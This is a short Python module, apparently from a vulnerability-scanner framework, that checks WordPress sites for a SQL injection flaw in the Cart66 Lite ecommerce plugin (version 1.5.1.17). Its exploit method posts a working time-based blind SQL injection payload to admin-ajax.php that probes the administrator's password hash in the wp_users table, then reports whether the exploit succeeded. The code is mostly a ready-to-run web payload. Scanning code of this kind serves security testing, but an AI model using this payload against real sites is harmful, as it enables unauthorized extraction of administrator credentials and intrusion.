from ..exploitsql import ExploitSql


class WordpressEcommerceSQL(ExploitSql):

	exploit_info = {
		'exploit_name': 'Cart66 Lite WordPress Ecommerce',
		'exploit_version': '1.5.1.17',
		'exploit_url': 'http://www.exploit-db.com/exploits/35459/'
	}

	def exploit(self):
		if self.loggedin:
			data = {
				'action': 'shortcode_products_table',
				'id': '0+UNION+(SELECT+IF(substr(user_pass%2C1%2C1)+%3D+CHAR(36)%2C+SLEEP(5)%2C+0)+FROM+wp_users+WHERE+'
					'ID+%3D+1)+--&oq=0+UNION+(SELECT+IF(substr(user_pass%2C1%2C1)+%3D+CHAR(36)%2C+SLEEP(5)%2C+0)+FROM'
					'+wp_users+WHERE+ID+%3D+1)+ -- ">'
			}
			response = self.request(self.hostname + '/wp-admin/admin-ajax.php', data=data, method='POST', urlencode=True)

			if response is not None and len(response) == 34 and '$' in response:
				self.exploitfound(self.exploit_info)
			else:
				self.exploitnotfound(self.exploit_info)
